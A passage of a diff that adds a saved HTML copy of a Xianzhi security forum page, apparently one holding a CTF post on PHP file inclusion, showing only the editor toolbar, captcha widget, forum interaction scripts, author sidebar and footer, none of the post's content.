class="CodeMirror-gutters" style="height: 443px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 28px;"></div><div class="CodeMirror-gutter CodeMirror-foldgutter"></div></div></div></div><a href="javascript:;" class="fa fa-close editormd-preview-close-btn"></a>
+<textarea class="editormd-html-textarea" name="editormd-html-code"></textarea>
+<div class="editormd-preview" style="display: none;"><div class="markdown-body editormd-preview-container"></div></div>
+<div class="editormd-container-mask" style="display: none;"></div>
+<div class="editormd-mask"></div><div class="editormd-toolbar" style="display: block;"><div class="editormd-toolbar-container"><ul class="editormd-menu"><li><a href="javascript:;" title="粗体" unselectable="on"><i class="fa fa-bold" name="bold" unselectable="on"></i></a></li><li><a href="javascript:;" title="横线" unselectable="on"><i class="fa fa-minus" name="hr" unselectable="on"></i></a></li><li><a href="javascript:;" title="斜体" unselectable="on"><i class="fa fa-italic" name="italic" unselectable="on"></i></a></li><li><a href="javascript:;" title="删除线" unselectable="on"><i class="fa fa-strikethrough" name="del" unselectable="on"></i></a></li><li><a href="javascript:;" title="引用" unselectable="on"><i class="fa fa-quote-left" name="quote" unselectable="on"></i></a></li><li class="divider" unselectable="on">|</li><li><a href="javascript:;" title="标题1" unselectable="on"><i class="fa editormd-bold" name="h1" unselectable="on">H1</i></a></li><li><a href="javascript:;" title="标题2" unselectable="on"><i class="fa editormd-bold" name="h2" unselectable="on">H2</i></a></li><li><a href="javascript:;" title="标题3" unselectable="on"><i class="fa editormd-bold" name="h3" unselectable="on">H3</i></a></li><li><a href="javascript:;" title="标题4" unselectable="on"><i class="fa editormd-bold" name="h4" unselectable="on">H4</i></a></li><li><a href="javascript:;" title="将每个单词首字母转成大写" unselectable="on"><i class="fa" name="ucwords" style="font-size:20px;margin-top: -3px;">Aa</i></a></li><li class="divider" unselectable="on">|</li><li><a href="javascript:;" title="无序列表" unselectable="on"><i class="fa fa-list-ul" name="list-ul" unselectable="on"></i></a></li><li><a href="javascript:;" title="有序列表" unselectable="on"><i class="fa fa-list-ol" name="list-ol" unselectable="on"></i></a></li><li><a href="javascript:;" title="添加表格" unselectable="on"><i class="fa fa-table" name="table" unselectable="on"></i></a></li><li><a href="javascript:;" title="链接" unselectable="on"><i class="fa fa-link" name="link" unselectable="on"></i></a></li><li><a href="javascript:;" title="添加图片" unselectable="on"><i class="fa fa-picture-o" name="image" unselectable="on"></i></a></li><li><a href="javascript:;" title="行内代码" unselectable="on"><i class="fa fa-code" name="code" unselectable="on"></i></a></li><li><a href="javascript:;" title="预格式文本 / 代码块（缩进风格）" unselectable="on"><i class="fa fa-file-code-o" name="preformatted-text" unselectable="on"></i></a></li><li><a href="javascript:;" title="代码块（多语言风格）" unselectable="on"><i class="fa fa-file-code-o" name="code-block" unselectable="on"></i></a></li><li class="divider" unselectable="on">|</li><li><a href="javascript:;" title="搜索" unselectable="on"><i class="fa fa-search" name="search" unselectable="on"></i></a></li><li><a href="javascript:;" title="HTML实体字符" unselectable="on"><i class="fa fa-copyright" name="html-entities" unselectable="on"></i></a></li><li><a href="javascript:;" title="开启实时预览" unselectable="on"><i class="fa fa-eye" name="watch" unselectable="on"></i></a></li><li><a href="javascript:;" title="全窗口预览HTML（按 Shift + ESC还原）" unselectable="on"><i class="fa fa-desktop" name="preview" unselectable="on"></i></a></li><li><a href="javascript:;" title="全屏（按ESC还原）" unselectable="on"><i class="fa fa-arrows-alt" name="fullscreen" unselectable="on"></i></a></li></ul></div></div></p>
+                        <input type="hidden" id="csessionid" name="csessionid">
+                        <input type="hidden" id="sig" name="sig">
+                        <input type="hidden" id="token" name="token">
+                        <input type="hidden" id="scene" name="scene">
+                        <div id="_umfp" style="display:inline;width:1px;height:1px;overflow:hidden"></div>
+
+                        <div class="nc-container hh_pt">
+                            <input type="submit" class="btn btn-info pull-right" style="margin: 2px 0 0 3% " value="发帖">
+                            <div id="dom_id" class="hh_merge nc-container" data-nc-idx="1">
+<div id="nc_1_wrapper" class="nc_wrapper">
+<div id="nc_1_n1t" class="nc_scale">
+<div id="nc_1__bg" class="nc_bg"></div>
+<span id="nc_1_n1z" class="nc_iconfont btn_slide"></span>
+<div id="nc_1__scale_text" class="scale_text slidetounlock"><span class="nc-lang-cnt" data-nc-lang="_startTEXT">请按住滑块，拖动到最右边</span></div>
+<div id="nc_1_clickCaptcha" class="clickCaptcha">
+<div class="clickCaptcha_text">
+<b id="nc_1__captcha_text" class="nc_captch_text"></b>
+<i id="nc_1__btn_2" class="nc_iconfont nc_btn_2 btn_refresh"></i>
+</div>
+<div class="clickCaptcha_img"></div>
+<div class="clickCaptcha_btn"></div>
+</div>
+<div id="nc_1_imgCaptcha" class="imgCaptcha">
+<div class="imgCaptcha_text"><input id="nc_1_captcha_input" maxlength="6" type="text" style="ime-mode:disabled"></div>
+<div class="imgCaptcha_img" id="nc_1__imgCaptcha_img"></div>
+<i id="nc_1__btn_1" class="nc_iconfont nc_btn_1 btn_refresh" onclick="document.getElementById(&#39;nc_1__imgCaptcha_img&#39;).children[0].click()"></i>
+<div class="imgCaptcha_btn">
+<div id="nc_1__captcha_img_text" class="nc_captcha_img_text"></div>
+<div id="nc_1_scale_submit" class="nc_scale_submit"></div>
+</div>
+</div>
+<div id="nc_1_cc" class="nc-cc"></div>
+<i id="nc_1__voicebtn" tabindex="0" role="button" class="nc_voicebtn nc_iconfont" style="display:none"></i>
+<b id="nc_1__helpbtn" class="nc_helpbtn"><span class="nc-lang-cnt" data-nc-lang="_learning">了解新功能</span></b>
+</div>
+<div id="nc_1__voice" class="nc_voice"></div>
+</div>
+</div>
+                        </div>
+                    </form>
+
+                
+            </div>
+        </div>
+    
+    <!-- editor for post -->
+    <script type="text/javascript">
+        $(document).ready(function () {
+            $('.post-action,.topic-action').css('cursor', 'pointer').click(function () {
+                var text = $(this).text();
+                var action = $(this).attr('data-action');
+                var pk = $(this).attr('data-pk');
+                $('.confirm-info span').text(text);
+                $('.modal-box,.post-confirm').removeClass('hidden');
+                $('body').css('overflow', 'hidden');
+                var url = "/forum/post/manage/";
+                if ($(this).hasClass('topic-action')) {
+                    url = "/forum/topic/manage/"
+                }
+                $('.sure').click(function () {
+                    $.ajax({
+                        url: url,
+                        method: "post",
+                        dataType: "json",
+                        data: {'action': action, 'pk': pk},
+                        success: function (arg) {
+                            if (!arg.status) {
+                                alert(arg.message);
+                                $('.modal-confirm,.modal-box').addClass('hidden');
+                                $('body').css('overflow', '')
+                            } else {
+                                window.location.reload()
+                            }
+                        }
+                    })
+                });
+            });
+
+            $('.cancel,.modal-box').click(function () {
+                $('.modal-confirm,.modal-box').addClass('hidden');
+            });
+
+            function thumb_change(ele) {
+                var count = ele.children('span').html();
+                if (ele.children('i').hasClass('fa-thumbs-o-up') || ele.children('i').hasClass('fa-star-o')) {
+                    ele.children('span').html(Number(count) + 1);
+                    if (ele.children('i').hasClass('fa-thumbs-o-up')) {
+                        ele.children('i').removeClass('fa-thumbs-o-up').addClass('fa-thumbs-up')
+                    }
+                    if ((ele.children('i').hasClass('fa-star-o'))) {
+                        ele.children('i').removeClass('fa-star-o').addClass('fa-star')
+                    }
+                }else {
+                    if (ele.children('i').hasClass('fa-thumbs-up') || ele.children('i').hasClass('fa-star')) {
+                    ele.children('span').html(Number(count) - 1);
+                    if (ele.children('i').hasClass('fa-thumbs-up')) {
+                        ele.children('i').removeClass('fa-thumbs-up').addClass('fa-thumbs-o-up')
+                    }
+                    if ((ele.children('i').hasClass('fa-star'))) {
+                        ele.children('i').removeClass('fa-star').addClass('fa-star-o')
+                    }
+                }
+                }
+
+            }
+
+            $('.thumbs,.collection').click(function () {
+                var action = $(this).attr('data-action');
+                var pk = $(this).attr('data-pk');
+                var topic = $(this).attr('data-topic');
+                var ele = $(this);
+                $.ajax({
+                    url: "/forum/approval/",
+                    dataType: 'json',
+                    method: 'post',
+                    data: {'action': action, 'pk': pk, 'csrfmiddlewaretoken': 'feSc4fIAIiFX9F51P1Zhiz4wVORY1BGdSjHFLTYZjdYp74u2gBvRFnwI8InuQaTD'},
+                    success: function (data) {
+                        if (data.not_authenticated) {
+                            window.location.href = "https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxianzhi.aliyun.com%2Fforum%2Ftopic%2F1576%2F&amp;from_type=xianzhi"
+                        }
+                        if (data.status) {
+                            thumb_change(ele);
+                        } else {
+                            return null
+                        }
+                    }
+                });
+
+            });
+
+            
+                var nc = new noCaptcha();
+                var nc_appkey = 'FFFF000000000175CCFB';  // 应用标识,不可更改
+                var nc_scene = 'login';  //场景,不可更改
+                var nc_token = [nc_appkey, (new Date()).getTime(), Math.random()].join(':');
+                var nc_option = {
+                    renderTo: '#dom_id',//渲染到该DOM ID指定的Div位置
+                    appkey: nc_appkey,
+                    scene: nc_scene,
+                    token: nc_token,
+                    trans: '{"name1":"code0"}',//测试用，特殊nc_appkey时才生效，正式上线时请务必要删除；code0:通过;code100:点击验证码;code200:图形验证码;code300:恶意请求拦截处理
+                    callback: function (data) {// 校验成功回调
+                        document.getElementById('csessionid').value = data.csessionid;
+                        document.getElementById('sig').value = data.sig;
+                        document.getElementById('token').value = nc_token;
+                        document.getElementById('scene').value = nc_scene;
+                    }
+                };
+                nc.init(nc_option);
+            
+        });
+    </script>
+    
+        <script src="./一道CTF题：PHP文件包含_files/editor-settings.js"></script>
+        <script src="./一道CTF题：PHP文件包含_files/marked.min.js"></script>
+        <script src="./一道CTF题：PHP文件包含_files/prettify.min.js"></script>
+        <script src="./一道CTF题：PHP文件包含_files/raphael.min.js"></script>
+        <script src="./一道CTF题：PHP文件包含_files/underscore.min.js"></script>
+        <script src="./一道CTF题：PHP文件包含_files/sequence-diagram.min.js"></script>
+        <script src="./一道CTF题：PHP文件包含_files/flowchart.min.js"></script>
+        <script src="./一道CTF题：PHP文件包含_files/jquery.flowchart.min.js"></script>
+    
+
+        </div>
+        <div class="span3 offset panel-body pull-right">
+            
+                
+                    <div class="box">
+                        <div class="info-panel">
+                            <a href="https://xianzhi.aliyun.com/forum/avatar/" class="hh_hone" style="display: block; width: 50px">
+                                
+                                    <img class="avatar" src="./一道CTF题：PHP文件包含_files/default_avatar.png">
+                                
+                            </a>
+                            <a href="https://xianzhi.aliyun.com/forum/user/4576/" class="hh_htow">
+                            <span style="margin-left: 10px;">
+                                    
+                                        <strong>sq1map</strong>
+                                    
+                                <div class="level-info">
+                                <img src="./一道CTF题：PHP文件包含_files/1-1.gif" class="hh_bronzemember" height="50" alt="sq1map" title="初级攻城狮">
+                                <span>初级攻城狮</span>
+                            </div>
+                            </span>
+                            </a>
+                            <hr>
+                            <div class="intro">
+                                <p>个人简介：</p>
+                                
+                                    <span>这个人很懒，什么都没留下</span>
+                                
+                                <hr>
+                            </div>
+                            <p>
+                                <i class="fa fa-pencil"></i>
+                                <a class="info-content" href="https://xianzhi.aliyun.com/forum/topic/create/">
+                                    <span>创建新帖子</span></a>
+                            </p>
+                            <hr>
+                            
+                                <i class="fa fa-bell"></i>
+                                <a class="info-content" href="https://xianzhi.aliyun.com/forum/notify/">
+                                    <span>暂无新消息</span></a>
+                            
+                            <hr>
+                            <i class="fa fa-sign-out"></i>
+                            <a class="info-content" href="https://account.aliyun.com/logout/logout.htm?oauth_callback=https%3A%2F%2Fxianzhi.aliyun.com%2Fforum%2Ftopic%2F1576%2F">
+                                <span>注销</span></a>
+                        </div>
+                    </div>
+                
+                <div class="box">
+                    <div class="info-panel" style="padding-bottom: 0!important; color: red">
+                        <i class="fa fa-fire"></i><a class="info-content " href="https://xianzhi.aliyun.com/forum/live/" style="color: red; font-weight: bold"><span>先知创新大会直播中...</span></a>
+                    </div>
+                </div> 
+                <div class="box">
+                    <div class="info-panel" style="padding-bottom: 0!important;">
+                        <i class="fa fa-rss"></i><a class="info-content" href="https://xianzhi.aliyun.com/forum/feed/"><span>RSS订阅</span></a>
+                    </div>
+                </div>
+
+                <div class="box front-box">
+                    <div class="info-panel">
+                        <span><strong>扫一扫，更多干货等着你</strong></span>
+                    </div>
+                    <hr>
+                    <div class="front-img">
+                        <img src="./一道CTF题：PHP文件包含_files/xianzhi_qr_code.jpg" alt="">
+                    </div>
+                </div>
+            
+        </div>
+        <div class="to-top">
+            <span><img src="./一道CTF题：PHP文件包含_files/totop.png" width="50" height="50" alt="返回顶部"></span>
+        </div>
+        <div class="to-bottom">
+            <span><img src="./一道CTF题：PHP文件包含_files/tobottom.png" width="50" height="50" alt="跳转底部"></span>
+        </div>
+    </div>
+
+    <div class="row2">
+        <div class="footer" style="clear: both">
+            <div class="w1200">
+                <div class="pull-left">
+                    <span>友情链接: </span>
+                    <a href="https://www.secpulse.com/" target="_blank">安全脉搏</a> |
+                    <a href="https://www.easyaq.com/" target="_blank">E安全</a> |
+                    <a href="http://www.leavesongs.com/" target="_blank">phithon</a> |
+                    <a href="http://www.77169.cn/" target="_blank">华盟网</a> |
+                    <a href="http://www.mottoin.com/" target="_blank">MottoIN</a> |
+                    <a href="http://www.4hou.com/" target="_blank">嘶吼</a> |
+                    <a href="http://www.nsoad.com/" target="_blank">网络攻防小组</a> |
+                    <a href="https://www.sec-wiki.com/" target="_blank">SecWiki</a>
+                </div>
+                <div class="pull-right">CSS Powered By 0xbug</div>
+            </div>
+        </div>
+    </div>
+
+</div>
+<!-- main content end -->
+
+
+
+<script src="./一道CTF题：PHP文件包含_files/z_stat.php" language="JavaScript"></script><script src="./一道CTF题：PHP文件包含_files/core.php" charset="utf-8" type="text/javascript"></script><a href="http://www.cnzz.com/stat/website.php?web_id=1260716569" target="_blank" title="站长统计">站长统计</a>
+
+<script></script><iframe id="evernoteClearlyArticle" frameborder="0" allowtransparency="true" scrolling="auto" class="" src="./一道CTF题：PHP文件包含_files/saved_resource.html"></iframe><div id="evernoteClearlyNextContainer" style="margin: 0px; padding: 0px; border: none; position: absolute; width: 5px; height: 5px; top: -10px; left: -10px;"></div></body></html>
